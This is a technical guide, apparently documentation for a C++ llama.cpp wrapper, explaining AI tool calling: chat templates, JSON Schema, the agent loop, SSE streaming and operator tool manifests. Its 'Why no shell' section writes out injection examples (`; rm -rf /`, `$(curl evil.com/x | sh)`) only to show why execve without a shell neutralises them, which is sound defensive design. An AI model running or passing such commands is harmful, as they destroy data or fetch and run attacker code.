# The Anatomy of AI Tools

### How a Language Model Reaches Out and Touches the World

> *"A model that cannot act on the world is a very expensive autocomplete.*
> *A model that can act, and is wrong, is a very expensive accident.*
> *Tools are how we hand the model a steering wheel without giving it the keys to the car."*

---

## Preface

This book is a careful, opinionated walk through one of the most important capabilities a modern language model has: **the ability to call tools**.

Not "agents" in the marketing sense. Not autonomous AI in the science-fiction sense. Just the small, mechanical, profoundly underestimated trick that lets a model say *"please run this function for me"* and lets a piece of software say *"here is what happened"* — and have the conversation continue as if nothing strange just occurred.

There is a lot going on under that simple exchange. There is a chat template, written in a language called Jinja, that decides what bytes the model actually sees. There is a JSON schema, written by you, that tells the model what tools exist and what arguments they take. There is a streaming protocol that emits the model's answer one fragment at a time, sometimes interleaving regular speech with hidden reasoning and structured tool calls. There is a runtime that catches those tool calls, dispatches them to functions, captures their output, and feeds the result back into the model so it can keep going. And there are a dozen places where a missing newline, an off-by-one tag, or an over-eager parser can quietly corrupt the whole thing.

The chapters that follow take all of that apart, slowly. Beginners can read straight through and end up with a complete mental model. Experienced engineers can skim and use the index of code excerpts as a reference. Both will, I hope, finish with the same conviction: **this is more complicated than it looks, and it deserves a real library.**

I will not name a library here. I will only describe — in honest detail — the work that any serious tool-using runtime has to do. By the last page, the case for a well-designed abstraction will, I think, make itself.

---

## How to read this book

* Each **Part** is a layer of the stack. Part I is the substrate (the model). Part II is the prompt (the chat template). Parts III–IV are the tool contract and its wire format. Part V is streaming. Part VI is deployment. Part VII is synthesis.
* Each **Chapter** opens with a short epigraph and closes with a *"Pitfalls"* or *"Exercises"* box. The epigraphs are not decoration; they are the one-line takeaway, written first.
* Boxes labelled **⚠ Pitfall** describe specific mistakes I have watched real engineers make. They are not hypothetical.
* Boxes labelled **🔬 Under the hood** are optional deep-dives. Skip them on first read.
* Code excerpts are deliberately short. They cite real lines from a real C++ wrapper around `llama.cpp` only when a concrete example is sharper than prose.

---

# PART I — The Substrate

> *"Before you understand tools, you have to understand what a model is, and what it is not."*

## Chapter 1 — The Next-Token Machine

A large language model is not a chatbot. A large language model is a function that takes a sequence of tokens and produces a probability distribution over the next token. That is all.

Everything else — chat, instructions, personality, tools, reasoning — is **a convention layered on top of that one operation.**

You give the model `["The", " sky", " is"]`, and it returns a vector of probabilities over its entire vocabulary, with `" blue"` near the top. You sample one token from that vector, append it, and call the function again. Roll forward in a loop, stop when you hit an end-of-sequence token, and you have generated text.

This is the substrate. Hold it firmly in mind for the rest of this book, because every advanced behaviour we describe — chat, tool calling, reasoning — is a *trick we play on the next-token machine* by carefully arranging the tokens it sees.

> **🔬 Under the hood — what is a token?**
> A token is not a word and not a character. It is a chunk of bytes chosen by a tokenizer to be statistically convenient. `"hello"` might be one token; `"antidisestablishmentarianism"` might be six. Tools, JSON, code — these all tokenize differently from prose, which is one reason tool-calling models need to be trained on the exact format you intend to use them with.

## Chapter 2 — From Completion to Chat

The first generation of language models accepted a flat string and produced a continuation. Useful, but inconvenient: how do you tell such a model which part is the user's question and which part is your hidden system instruction? How do you make it remember earlier turns without re-pasting them?

The answer was the **chat format**: a structured list of *messages*, each tagged with a *role* — typically `system`, `user`, `assistant`, and (later) `tool`. Conceptually:

```python
[
  {"role": "system",    "content": "You are a helpful assistant."},
  {"role": "user",      "content": "What is 2+2?"},
  {"role": "assistant", "content": "4"},
  {"role": "user",      "content": "Now multiply by 7."},
]
```

This is the *interface* most APIs expose today. It is not, however, what the model actually receives. The model — being a next-token machine — still wants a flat token sequence. Something has to flatten the structured chat into a string the model was trained to recognise.

That something is the **chat template**.

> **⚠ Pitfall — confusing the API surface with the wire format.**
> When you send a JSON list of messages to an OpenAI-compatible endpoint, you are talking to a *server* that flattens those messages, runs the model, and re-structures the model's reply. The model itself never sees JSON. It sees a long string with carefully placed special tokens. Forget this and you will spend hours debugging a "tool calling bug" that is really a *template bug*.

## Chapter 3 — Chat Templates: The Flattener

A chat template is a small program. Its input is a list of structured messages (and, as we will see, a list of tools). Its output is a single string of tokens, ready to be fed to the model.

A trivial template might produce:

```
<|system|>You are a helpful assistant.<|end|>
<|user|>What is 2+2?<|end|>
<|assistant|>4<|end|>
<|user|>Now multiply by 7.<|end|>
<|assistant|>
```

Notice three things:

1. **Special tokens** like `<|user|>` and `<|end|>` are not regular text. They are single tokens in the model's vocabulary, used during training as unambiguous boundary markers. The model has *learned* that text after `<|user|>` and before `<|end|>` is a user turn.
2. The conversation ends with `<|assistant|>` and **no closing tag**. This is the *generation prompt*: it tells the model "your turn now". The next-token machine, having been trained on millions of these patterns, will helpfully continue with assistant-style content.
3. The flattener is **lossy in one direction**: many possible structured chats produce the same string. But for the model, that string is the only ground truth.

In the next part, we will look at the actual language these templates are written in — Jinja — and read one line by line.

> **Exercise.** Take any chat-tuned model's `tokenizer_config.json`, find the `chat_template` field, paste it into a Jinja sandbox, and render a two-message conversation. The output is *exactly* what the model sees. There is no other magic.

---

# PART II — The Chat Template, In Depth

> *"The template is the contract. Everything you tell the model, you tell it through the template. Everything you fail to tell the model, you fail because the template is wrong."*

## Chapter 4 — Why Jinja?

Chat templates need to do conditional logic ("if this message has a system role, render it like *this*; otherwise skip"), loops ("for every message, render it"), and string manipulation. They need to be portable — runnable from Python, C++, Rust, Go, JavaScript — without each runtime re-implementing them. And they need to be shippable *with the model*, so that whoever downloads the weights also downloads the exact byte-perfect ritual the model expects.

Jinja2 — a templating language originally from the Python web ecosystem — turned out to fit. It has loops, conditionals, filters, macros, and a small enough surface that it can be re-implemented in any language. The Hugging Face community standardised on it; `llama.cpp` ships an embedded Jinja engine; OpenAI-compatible servers use it. It is now the lingua franca of chat formatting.

A Jinja template is mostly literal text, with three kinds of escapes:

* `{{ expression }}` — interpolate a value.
* `{% statement %}` — run a control-flow statement (`if`, `for`, `set`).
* `{# comment #}` — ignored.

Everything outside those escapes is emitted verbatim into the output string.

## Chapter 5 — Reading a Real Chat Template

Here is a simplified ChatML-family template (the family used by Qwen, many Llama derivatives, and others). Read it carefully:

```jinja
{%- for message in messages %}
  {%- if message.role == "system" %}
<|im_start|>system
{{ message.content }}<|im_end|>
  {%- elif message.role == "user" %}
<|im_start|>user
{{ message.content }}<|im_end|>
  {%- elif message.role == "assistant" %}
<|im_start|>assistant
{{ message.content }}<|im_end|>
  {%- elif message.role == "tool" %}
<|im_start|>tool
{{ message.content }}<|im_end|>
  {%- endif %}
{%- endfor %}
{%- if add_generation_prompt %}
<|im_start|>assistant
{%- endif %}
```

Walk through it with me:

* The outer `for` iterates over the structured messages list.
* Each `if/elif` branch chooses an envelope. The envelope is `<|im_start|>ROLE\n…<|im_end|>` — two special tokens wrapping the role name and the message body.
* At the end, *if* the caller asked for a generation prompt, we emit `<|im_start|>assistant` with **no closing tag**. The model interprets this as "begin assistant turn", and the sampler runs from there.
* The `{%-` and `-%}` syntax (note the dashes) strips surrounding whitespace, so the rendered output is clean.

That's it. That is the entire mechanism by which structured chat becomes a flat token sequence.

> **🔬 Under the hood — special tokens vs literal strings.**
> `<|im_start|>` looks like a string of ASCII characters, but in the tokenizer's vocabulary it is **one token**. When you write it in a Jinja template, the tokenizer encodes it as that single token, not as ten separate characters. This is why you cannot simply replace `<|im_start|>` with `[START]` and expect the model to understand: the model has only ever seen the *one-token* version during training.

## Chapter 6 — System Prompts, Roles, and the Tool Role

The `system`, `user`, and `assistant` roles you have seen before. The fourth role — `tool` — is what makes everything else in this book possible.

A `tool` message represents the *result* of a tool the model previously asked to call. Its `content` is whatever the tool returned (typically a string of JSON, plain text, or a structured payload). It is delivered to the model the same way any other message is delivered: rendered through the chat template, wrapped in role-tagged envelopes, and prepended to the next generation step.

In other words: **a tool's output looks, to the model, exactly like another speaker in the conversation.** The model has been trained to expect that whenever it emitted a tool-call, the next turn it sees will be a `tool`-roled message containing the result. From the model's point of view, calling a tool is just a particular kind of speech act, and reading a tool result is just listening.

Hold this in mind: there is no "API" between the model and a tool. There is only conversation, formatted into tokens, parsed back into structure, and re-formatted again at every turn.

## Chapter 7 — `add_generation_prompt`

One small but important Jinja variable: `add_generation_prompt`. When `True`, the template appends an opening assistant envelope with no closing tag. When `False`, it does not.

* You set it to `True` when you want the model to **generate next**.
* You set it to `False` when you want to render an existing transcript for *training data* or for showing a user, without prompting generation.

Tool-calling runtimes always set it to `True` for inference. Get this wrong and the model will either generate nothing (no prompt to continue from) or generate a new user turn (because the prompt ended cleanly and it has no idea what comes next).

> **⚠ Pitfall.** If your model's responses suddenly start with the literal text `assistant\n`, it means your runtime double-rendered the generation prompt — once via the template, once again as a manual prefix. The model dutifully completed it like training data.

---

# PART III — Tools, The Contract

> *"A tool is a promise. The model promises to call it correctly; you promise to do something useful when called."*

## Chapter 8 — What Is a Tool?

A tool, at its irreducible core, is **four things**:

1. A **name** the model can refer to (`search_web`, `read_file`, `send_email`).
2. A **description** in plain English — what does it do, when should it be called?
3. A **parameter schema** — what arguments does it take, and what types?
4. A **handler** — the actual function that runs when the tool is invoked.

Every serious tool-calling system — OpenAI's function calling, Anthropic's tool use, llama.cpp's `common_chat_tool`, your home-grown C++ wrapper — represents tools as a struct with these four fields. Here is one such representation, drawn from a real C++ codebase:

```cpp
struct Tool {
    std::string  name;
    std::string  description;
    std::string  parameters_json;   // JSON schema (object)
    ToolHandler  handler;           // std::function<ToolResult(const ToolCall&)>
};
```

(See `include/easyai/tool.hpp:40` for the full definition.) The shape is so simple it almost looks too simple. But all the complexity in the rest of this book lives in *how those four fields are conveyed to the model and back*.

## Chapter 9 — JSON Schema: The Lingua Franca of Parameters

The parameter schema is written in **JSON Schema** — a standard way of describing the structure of a JSON document. For a `search_web` tool, the schema might be:

```json
{
  "type": "object",
  "properties": {
    "query":        { "type": "string",  "description": "Search query" },
    "max_results":  { "type": "integer", "description": "How many to return" }
  },
  "required": ["query"]
}
```

Why JSON Schema? Three reasons:

1. **It is what the model was trained on.** Almost every modern tool-calling model has seen examples in this exact shape during fine-tuning. Deviate from it and the model's accuracy drops noticeably.
2. **It is checkable.** Before you dispatch a tool call, you can validate the model's arguments against the schema and reject malformed calls without ever invoking your handler.
3. **It is self-documenting.** The `description` fields are not for *you* — they are for the model. The model reads the schema, in plain English, and uses it to decide when and how to call the tool. Vague descriptions cause vague tool use. Sharp descriptions cause sharp tool use.

> **⚠ Pitfall — under-described parameters.**
> Writing `{"query": {"type": "string"}}` with no description is one of the most common mistakes. The model will guess what `query` means from the tool name, and it will sometimes guess wrong. Treat every description field as if you were writing documentation for a junior developer who has never used your codebase before.

> **🛠 Practical guidance.**
> For the recipe used by `plan` / `memory` / the polished filesystem tools — when to use single-action vs. multi-action shape, what to put in `describe()`, how to lead each `.param()` description, and the tolerance shims that catch models going off-spec — see [`design.md` §5 "Writing tool descriptions reliably"](design.md) and [`manual.md` §3.2.1](manual.md). The two together are the working contract for a reliable tool surface.

## Chapter 10 — The Agent Loop

Once a model can call tools, the conversation grows a new shape. It is no longer one user message and one assistant reply. It is a **loop**:

```
1. The model sees: system + user + (history) + (any prior tool results)
2. The model emits: either a final assistant message (done)
                    or a tool-call request (more work to do)
3. If tool call:
     a. Runtime parses the call.
     b. Runtime dispatches to the registered handler.
     c. Runtime captures the handler's result.
     d. Runtime appends a `tool` message with that result.
     e. Runtime re-prompts the model. Go to step 1.
4. If final message: emit to user, exit loop.
```

This loop is the heart of every "AI agent" you have ever heard of. It can iterate two times or twenty. The model can call multiple tools in parallel within a single turn. The loop terminates when the model decides it has enough information to answer the user.

Conceptually, three components must cooperate to make this work:

* The **template** must know how to render tool definitions (so the model knows what is available) and tool results (so the model can read them).
* The **parser** must know how to extract tool calls from the model's streaming output.
* The **dispatcher** must know how to map a parsed call to a handler, run it safely, and shape the result back into a message.

The next part walks through each of those components on the wire.

---

# PART IV — Tools On The Wire

> *"All abstractions leak. Tool calling leaks through tokens, and to debug it, you must read those tokens."*

## Chapter 11 — Advertising Tools In The Prompt

When you tell a model "you have a `search_web` tool", you are not setting a hidden flag. You are *literally including the tool list in the prompt*, formatted by the chat template, before the model generates anything.

In Jinja, a tool-aware template looks like this (simplified):

```jinja
{%- if tools %}
<|im_start|>system
You have access to the following tools:

{%- for tool in tools %}
- {{ tool.name }}: {{ tool.description }}
  Parameters: {{ tool.parameters | tojson }}
{%- endfor %}

To call a tool, emit a JSON object inside <tool_call>…</tool_call> tags
with keys "name" and "arguments".
<|im_end|>
{%- endif %}
```

Read what that produces, given two registered tools:

```
<|im_start|>system
You have access to the following tools:

- search_web: Search the web for a query.
  Parameters: {"type":"object","properties":{"query":{"type":"string"}},"required":["query"]}
- datetime: Return the current date and time.
  Parameters: {"type":"object","properties":{}}

To call a tool, emit a JSON object inside <tool_call>…</tool_call> tags
with keys "name" and "arguments".
<|im_end|>
```

That is what the model sees. There is no separate "tool channel". The list of tools is plain text in a system message, and the model's behaviour depends on three things:

1. **The training distribution.** The model must have been fine-tuned on conversations where tools were advertised this way and then called. Otherwise it will not know what to do.
2. **The exact formatting.** Models are sensitive to tag names, JSON shape, and even punctuation. Use the format the model was trained on. (Qwen, Hermes, DeepSeek, Llama-3-Instruct, GPT-OSS — they each have minor variations.)
3. **The presence of `tools` in the template's input.** If your runtime does not pass tools to the chat template renderer, none of this happens. The model sees no advertisement and will (correctly) refuse to call any tool. We will see a real call-site for this in a moment.

A real C++ runtime, internally, prepares the tool list like this before invoking the Jinja engine:

```cpp
// src/engine.cpp — Pimpl::chat_tools()
std::vector<common_chat_tool> chat_tools() const {
    std::vector<common_chat_tool> out;
    for (const auto & t : tools) {
        // Ships the SHORT trigger (Tool::wire_description) — the long
        // description stays server-side and is only surfaced when the
        // model calls `tool_lookup`.  Saves ~2 000 tokens per session
        // on a typical 7-tool catalogue, no behavioural change.
        out.push_back({ t.name, t.wire_description(), t.parameters_json });
    }
    return out;
}

// called once per generation
in.messages            = history;
in.tools               = chat_tools();
in.tool_choice         = ...;
in.parallel_tool_calls = true;
in.reasoning_format    = COMMON_REASONING_FORMAT_AUTO;
auto rendered = common_chat_templates_apply(templates.get(), in);
```

The struct `common_chat_tool` carries the name, *short* description, and JSON schema. The renderer feeds them into the template's `tools` variable; the Jinja code advertises them.

> **Shape-C wire shape.** easyai's `Tool` struct carries TWO description fields:
> * `short_description` — one-line trigger (≤ 80 chars). Ships in `<tools>` every turn.
> * `description` — full manual: rules, examples, edge cases. Stays in libeasyai and is returned by `tool_lookup(name="<x>")` when the model needs detail.
>
> A tool that doesn't set `short_description` keeps working — `wire_description()` falls back to the first 120 chars of `description`.  Builders use `.short_describe("…")` alongside `.describe("…")`.

## Chapter 12 — Encoding A Tool Call

Now the model has been advertised tools. It is generating a response. At some point it decides: "I should call `search_web`."

The model emits something like this *as part of its normal token stream*:

```
<tool_call>
{"name": "search_web", "arguments": {"query": "current weather in Lisbon"}}
</tool_call>
```

That is the call. Just text. JSON wrapped in tags. The tags vary by model family — Qwen3 uses `<tool_call>…</tool_call>`, Llama-3-Instruct uses a special header token, Hermes uses `<tool_call>` JSON lines, GPT-OSS uses a different envelope again — but the *shape* is universal: a structured payload, embedded in the assistant's output, that names the function and its arguments.

When you talk to an OpenAI-compatible **server**, you do not see this raw format. The server has already parsed it for you, and re-shaped it into a structured JSON delta:

```json
{
  "choices": [{
    "delta": {
      "tool_calls": [{
        "index": 0,
        "id": "call_abc123",
        "type": "function",
        "function": {
          "name": "search_web",
          "arguments": "{\"query\": \"current weather in Lisbon\"}"
        }
      }]
    }
  }]
}
```

Note the indirection: `function.arguments` is a *string* — a JSON-encoded JSON document, escaped once. This is so the field can be streamed in fragments without breaking JSON parsing. We come back to that in Chapter 16.

> **🔬 Under the hood — why a separate `id` field?**
> In a single turn, the model can call multiple tools in parallel (`parallel_tool_calls = true`). Each call gets a unique `id` so that when the runtime returns results, it can pair each result back to the correct call. Without IDs, parallel calls would collapse together. The runtime fabricates IDs (`call_0`, `call_1`, …) when the model does not provide them.

## Chapter 13 — Catching A Tool Call From The Stream

The model does not emit a complete tool call as one indivisible token. It streams it, piece by piece, the same way it streams ordinary prose. From the runtime's perspective, the SSE event sequence might look like:

```
delta {"content": "Let me check that for you."}
delta {"content": " "}
delta {"tool_calls": [{"index": 0, "id": "call_abc", "function": {"name": "search_web", "arguments": ""}}]}
delta {"tool_calls": [{"index": 0, "function": {"arguments": "{\"que"}}]}
delta {"tool_calls": [{"index": 0, "function": {"arguments": "ry\":\"weather"}}]}
delta {"tool_calls": [{"index": 0, "function": {"arguments": " in Lisbon\"}"}}]}
finish_reason "tool_calls"
```

The runtime must accumulate these fragments. Below is the canonical accumulator pattern:

```cpp
// client.cpp:185 — the partial-tool-call buffer
struct PendingToolCall {
    int         index = -1;
    std::string id;
    std::string name;
    std::string arguments;     // built up across deltas
};
std::map<int, PendingToolCall> tc_by_index;
```

For each incoming delta:

```cpp
// client.cpp:451 — accumulate fragments
for (auto & call : delta["tool_calls"]) {
    int idx = call.value("index", 0);
    auto & p = tc_by_index[idx];
    if (call.contains("id"))   p.id   = call["id"];
    if (call["function"].contains("name"))
        p.name = call["function"]["name"];
    if (call["function"].contains("arguments"))
        p.arguments += call["function"]["arguments"].get<std::string>();
}
```

When `finish_reason == "tool_calls"` arrives, the runtime walks the accumulator, builds a final `ToolCall` for each entry, and hands the list to the dispatcher.

> **⚠ Pitfall — assuming arguments arrive as one delta.**
> They do not. They arrive as N deltas, each carrying a slice of the JSON string. If you `json.loads()` each delta you will throw. You must concatenate first, then parse only when the call is complete.

## Chapter 14 — Dispatching, Capturing, Answering

The runtime now holds a structured `ToolCall`:

```cpp
struct ToolCall {
    std::string name;
    std::string arguments_json;
    std::string id;
};
```

It looks up `name` in its tool registry, finds the `Tool` with the matching name, and invokes the handler:

```cpp
// engine.cpp:1411 — actual dispatch
try {
    result = tool->handler(call);
} catch (const std::exception & e) {
    result = ToolResult::error(e.what());
}
```

The handler is just a function. It can do anything: read a file, hit an HTTP endpoint, run a shell command, query a database, send a notification. It returns a `ToolResult`:

```cpp
struct ToolResult {
    std::string content;
    bool        is_error = false;
};
```

The runtime then appends a `tool`-roled message to the history with that content and the matching `tool_call_id`, and re-renders the prompt. The chat template knows how to format tool results — they look something like:

```
<|im_start|>tool
{"results": [{"title": "Weather in Lisbon", "url": "...", ...}]}
<|im_end|>
```

The next inference step starts. The model now sees the full conversation, *including* its own prior tool call and the tool's reply, and continues — usually by reading the tool result and producing a final assistant message that uses it.

That, end to end, is tool calling.

> **⚠ Pitfall — handlers that throw across the FFI boundary.**
> Native handlers (C++, Rust, Go) routinely throw exceptions or panic on bad input. A naive runtime that does not catch them will crash the entire agent loop on the first malformed argument. Always wrap dispatch in a try/catch and convert exceptions into `ToolResult::error(...)`. The model is remarkably good at recovering from a polite "your call failed because X" — and remarkably bad at recovering from a SIGSEGV.

> **🔬 Under the hood — server-side vs client-side dispatch.**
> Some runtimes execute tools on the **client** (the program holding the conversation) and only ship results to the model. Others let the **server** execute them, running handlers in the same process as the model. Both are valid. Server-side dispatch is simpler for self-contained applications (the model and tools live together). Client-side dispatch is necessary when the tools are sensitive (filesystem, databases, network) and you do not want a public model server to have access to them. A real example: `examples/server.cpp:1493` deserialises tool calls from the wire but **does not execute them**; it expects the calling program to.

---

# PART V — Streaming and Partial State

> *"A model thinks one token at a time. So must your parser."*

## Chapter 15 — SSE: The Heartbeat of LLM I/O

Server-Sent Events (SSE) is the protocol everyone settled on for streaming LLM output. It is a simple HTTP-based format: the server keeps the connection open, and emits events as `data: ...\n\n` lines as it generates them. The client reads them one at a time and reacts.

A typical SSE stream from an OpenAI-compatible server looks like:

```
data: {"choices":[{"delta":{"role":"assistant"}}]}

data: {"choices":[{"delta":{"content":"Hello"}}]}

data: {"choices":[{"delta":{"content":", world"}}]}

data: {"choices":[{"delta":{"content":"!"},"finish_reason":"stop"}]}

data: [DONE]
```

Each chunk carries a `delta` — a partial update to the response. The client accumulates them into a final message. The point of streaming is **latency**: the user sees the first words within ~100ms of pressing Enter, instead of waiting for the entire response to finish.

For tool calling, streaming has another consequence: the model can begin its reply with prose, then mid-sentence emit a tool call, then continue. The runtime must be ready to pivot.

## Chapter 16 — Partial JSON, Partial Tool Calls

Tool-call arguments are JSON, but they arrive across multiple SSE deltas. This means at any moment, the runtime is holding **incomplete JSON**. Three concrete consequences:

1. **You cannot validate against the schema until the call is complete.** Validating partial JSON makes no sense.
2. **You must concatenate arguments before parsing.** As shown in Chapter 13, append-then-parse-on-finish is the only safe pattern.
3. **You must be tolerant of out-of-order deltas.** Some servers send tool-call fragments interleaved with content fragments. The accumulator's `index`-keyed map handles this naturally: each fragment is routed to its own slot regardless of arrival order.

There is a separate, fancier pattern called **partial parsing**, where you incrementally parse JSON as it streams to surface progress to the user (for example, showing the user "the model is calling `search_web` with query=...weather..." as it types). This requires a streaming JSON parser and a chat-format-aware partial parser like `common_chat_parse(text, is_partial=true, ...)`. It is optional; not all runtimes do it. It exists, and you should know about it, but you can build a perfectly good agent without it.

## Chapter 17 — The Reasoning Channel

Some modern models emit a third stream of output, separate from regular content and from tool calls: **reasoning**. These are the model's "internal" thoughts — chain-of-thought-style monologue that the model uses to plan its response.

In the wire format, this appears as `delta.reasoning_content`, not `delta.content`:

```
data: {"choices":[{"delta":{"reasoning_content":"The user is asking about weather. I should call search_web..."}}]}
data: {"choices":[{"delta":{"content":"Let me check the weather for you."}}]}
data: {"choices":[{"delta":{"tool_calls":[...]}}]}
```

Why a separate channel? Three reasons:

1. **UX.** Most users do not want to see the model's internal monologue. Splitting the channels lets the runtime hide reasoning by default and reveal it only on demand.
2. **Token budget.** Reasoning can be long. Putting it in its own channel lets servers truncate or summarise it without affecting visible content.
3. **Training.** Models trained to emit reasoning in a dedicated channel are demonstrably more controllable than ones that mix it into regular text.

Some models, however, **leak** their reasoning into the content stream — emitting `<think>...</think>` blocks inline rather than via `reasoning_content`. A robust runtime handles both. The pattern is a stateful filter that scans the content stream for `<think>` openers, routes the inner text to the reasoning channel, and resumes content emission at `</think>`:

```cpp
// Concept: a streaming filter for inline <think> blocks
class ThinkStripper {
    std::string buffer_;
    bool        in_think_ = false;
public:
    std::string filter(const std::string & piece) {
        buffer_ += piece;
        // ... walk buffer_ looking for <think> / </think>
        // ... emit visible text, swallow inner text, hold ambiguous tail
    }
    std::string flush() { /* emit residual */ }
};
```

(See `include/easyai/text.hpp:86` for a complete implementation.) The trick is *holding only the trailing few bytes* that could still be the start of a tag, so plain prose with `<` characters (`if a < b`) does not get buffered indefinitely.

> **⚠ Pitfall — splitting tags across SSE chunks.**
> The bytes `<th` might arrive in one delta and `ink>` in the next. A naive scanner that processes deltas independently will miss the tag entirely. The buffer must persist across deltas, and the runtime must hold any trailing prefix that *could* be the start of a tag until the next delta arrives.

---

# PART VI — Local vs Remote

> *"Where the model runs is a deployment decision. How tools work is a protocol decision. Do not confuse them."*

## Chapter 18 — Running A Model Locally

When the model runs in your own process — `llama.cpp`, MLC, ONNX Runtime, vLLM-as-a-library — the agent loop becomes a tight in-memory cycle. Inference produces tokens, those tokens are parsed for tool calls, handlers run, results are formatted, the loop repeats. There is no network, no JSON, no SSE. The only thing being shipped between components is structs.

Local execution has three large advantages:

1. **Latency.** No network round-trip. The agent loop iterates as fast as the GPU can serve.
2. **Privacy.** Sensitive data never leaves the box.
3. **Determinism.** With a fixed seed, the same prompt produces the same response. Useful for testing.

And three large costs:

1. **Resource.** Even quantised, a capable model wants several gigabytes of GPU or unified memory.
2. **Update cadence.** Frontier models ship weekly. Pinning a local model means freezing capability.
3. **Operational scope.** You manage tokenizers, templates, GPU drivers, sampler parameters. The complexity does not disappear; it sits with you.

## Chapter 19 — Running A Model Remotely

Remote execution — talking to an OpenAI-compatible HTTP endpoint — is the default for most application teams. The endpoint is a network resource; you POST a `chat/completions` request, you read SSE deltas back. Everything in this book applies, but compressed: the *server* runs the chat template, parses tool calls, emits structured deltas, and exposes a clean OpenAI shape to your client. Your client only sees tools as JSON, never as tokens.

This is convenient *and* a trap. The server is doing the work, but the work is still there. When something goes wrong — a tool call mysteriously not arriving, a `<think>` tag bleeding into content, a parameter being malformed — debugging requires understanding what the server *would have done* with the template, the parser, and the dispatcher. The whole stack does not vanish; it is hidden behind a JSON facade.

A robust client therefore needs:

* SSE parsing.
* The same delta accumulator as Chapter 13.
* Tolerance for partial JSON and out-of-order chunks.
* Optional handling of the reasoning channel.
* A timeout and retry strategy that is aware of the loop (you do not want to retry the user prompt; you might want to retry a single tool call).

Even when "the model is in the cloud", *your* program is the agent loop's host, and *your* program owns the tool handlers.

## Chapter 20 — Hybrid Architectures

The most interesting deployments are hybrid:

* The **model** runs on a managed endpoint (OpenAI, Anthropic, a llama.cpp server on your GPU box).
* The **tool dispatch** runs in your client process, where the credentials, filesystem, database connections, and proprietary code live.

This split is not just an aesthetic choice. It is often forced by security: your `read_secrets` tool cannot run inside a public-facing model server. It must live where the secrets live, called by the user's own process. The protocol — chat template, SSE, structured tool calls — is how those two halves negotiate.

Here is the practical arrangement:

```
+--------+        prompt + tools        +-----------+
| Your   | ---------------------------> | Model     |
| client |        SSE deltas            | server    |
|        | <--------------------------- |           |
|        |        tool result           +-----------+
|        | --------------------------->
|        | <---------------------------
+--------+

Inside the client:
  - Tool registry (handlers run here)
  - SSE parser
  - Tool-call accumulator
  - Reasoning channel filter
  - Conversation history
```

Notice the tools never leave the client. The server is an *inference oracle* — it knows the model and runs it — but the side effects happen in the client. This is the architecture most production AI systems converge on.

## Chapter 21 — Operator-Defined Tools at Deploy Time

> *"Some tools are written by the agent's author. Some tools are written by the agent's operator. The interesting question is who gets to declare which is which."*

So far in this book, every tool has been a function in your codebase: you wrote it, you reviewed it, you compiled it, you shipped it. That is the right model for tools that ship with the agent — `fetch_web`, `datetime`, `read_file`. The author owns them; the author maintains them.

But there is a different role in production: **the operator**. The operator is the person running your agent in *their* environment. They have CLIs, internal scripts, deploy tools, monitoring queries — programs that exist on their box, that *your* code has never seen, that they want the model to be able to invoke.

If your library has no answer for that role, the operator will reach for the worst available option: a generic shell tool. They will wire `bash` (or `system()`, or `subprocess`) into the agent and hope the model behaves. They will discover, eventually, that the model is creative.

A better answer is the **operator manifest** — a deploy-time JSON file that declares exactly which commands the model is allowed to dispatch, what arguments each takes, and the resource caps. The operator picks the surface area; the library enforces the safety. The model fills in parameter values; the schema rejects everything else.

Think of the manifest as **`sudoers` for tool calling**. Anyone who can write the file can run arbitrary commands as the agent's user. The file is part of the deploy artefact: code-reviewed, version-controlled, owned by the operator. The model never sees it, never writes to it, never escapes from it.

### The shape of a good manifest

A serious operator-tools manifest declares, for each entry:

| Field | Why it matters |
| --- | --- |
| `name` | Identifier the model uses. Validated against a strict regex. Cannot collide with built-ins. |
| `description` | Plain English. The model reads this to decide *when* to call the tool. The single most important field. |
| `command` | **Absolute** path to a regular, executable file. No PATH lookup. |
| `argv` | Template array of literals and `"{name}"` placeholders. **Whole-element only.** |
| `parameters` | JSON-Schema-shaped: `type: object`, `properties: {...}`, `required: [...]`. |
| `timeout_ms` | Cooperative deadline — SIGTERM, then SIGKILL after a grace. |
| `max_output_bytes` | Per-call output cap. Excess discarded; child stays unblocked. |
| `cwd` | Working directory. Either absolute or a `$SANDBOX`-style sentinel. |
| `env_passthrough` | Allowlist of env vars to inherit. Default empty. |
| `stderr` | `merge` or `discard`. |

That schema, lightly disguised, is what every well-designed operator-tools subsystem ends up with. The fields are the questions a careful operator asks: *"Where does it live? What can it take? How long can it run? How much can it produce? What env does it need?"*

### Why no shell

The dispatcher is `fork()` + `execve(absolute_path, argv, envp)`. There is no `/bin/sh -c` anywhere in the call path. The consequence:

A model argument that contains `; rm -rf /` is **one argv element**, not a command separator. A model argument that contains `$(curl evil.com/x | sh)` is one argv element, not a substitution. Backticks, redirects, glob metacharacters, `&&`, `||` — none of those are special outside a shell, and we never invoke a shell.

This is a **structural** guarantee, not a "we sanitised the inputs" guarantee. Sanitisation is a moving target — every escape is a regex away from being wrong on some new platform. Structural absence of a parser is permanent. There is nothing to sanitise because there is nothing to escape.

The price: pipes, redirects, globbing — none of those work without a shell. Operators who actually need them keep using a shell tool (which has to be honest about being unsafe). The manifest is for the 90% of tool calls that don't need a shell.

> **⚠ Pitfall — building a "safe shell."** Every few years, somebody tries to ship a "safe shell" tool: a sandboxed `/bin/sh` with a denylist of dangerous commands. It never works. Shells are Turing-complete; denylists are leaky; the next clever trick is one Stack Overflow answer away. Don't try to make `bash` safe. Make `bash` rare instead, and give the operator something better for the common case.

### Why absolute paths

`command` must start with `/`. No `command: "uname"` accepted. Two reasons:

1. **No PATH-hijack.** If the agent's `PATH` includes a writable directory (`~/.local/bin`, a containerised `/tmp`), an attacker who can drop a binary called `uname` into it would otherwise hijack the manifest's `host_uname` tool. Requiring an absolute path closes this. The operator picked `/usr/bin/uname` and that is exactly what runs.

2. **No environment drift.** `command: "rg"` works on the dev box where ripgrep is in PATH and breaks in the production container where it isn't. Absolute paths force the operator to confront where the binary actually lives.

`PATH` itself can still be passed through to the subprocess — git, for instance, invokes `git-log` via PATH. That's an operator decision per tool, declared in `env_passthrough`.

### Why whole-element placeholders

A manifest entry like:

```json
{ "argv": ["--filter={query}"] }
```

is rejected at load time. The valid form is:

```json
{ "argv": ["--filter", "{query}"] }
```

Why be strict about this? The first form looks innocent — and indeed, with `query = "foo"` it works. But the moment a model passes `query = "a b c"` you have to ask: do we quote the embedded space? What about quotes inside the value? What about `--filter=` with a trailing `=` followed by nothing? The first form invites a per-element interpolator, and writing a *correct* one is the same trap as writing a "safe shell."

Splitting at the brace removes the question entirely. The literal `--filter` is its own element. The `{query}` is its own element. No interpolator, no escaping rules, no edge cases.

